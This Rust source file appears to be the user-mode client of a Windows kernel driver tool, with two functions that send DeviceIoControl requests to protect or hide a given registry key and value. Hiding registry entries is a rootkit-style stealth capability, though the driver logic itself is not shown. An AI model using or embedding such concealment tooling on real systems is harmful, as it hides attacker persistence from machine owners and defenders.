use {
    crate::driver::open_driver,
    std::{ffi::c_void, ptr::null_mut},
    shared::structs::TargetRegistry,
    windows_sys::Win32::{Foundation::CloseHandle, System::IO::DeviceIoControl},
};

pub fn registry_protection(ioctl_code: u32, value: &String, key: &String, enable: bool) {
    let h_file = open_driver().expect("Failed to open driver");
    let mut info_registry = TargetRegistry {
        enable,
        value: value.to_string(),
        key: key.to_string()
    };
    let mut return_buffer = 0;
    let status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_registry as *mut _ as *mut c_void,
            std::mem::size_of::<TargetRegistry>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        println!("[+] Registry protection succeeded!");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn registry_hide(ioctl_code: u32, value: &String, key: &String, enable: bool) {
    let h_file = open_driver().expect("Failed to open driver");
    let mut info_registry = TargetRegistry {
        enable,
        key: key.to_string(),
        value: value.to_string(),
        ..Default::default()
    };
    let mut return_buffer = 0;
    let status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_registry as *mut _ as *mut c_void,
            std::mem::size_of::<TargetRegistry>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        println!("[+] Registry hide succeeded!");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}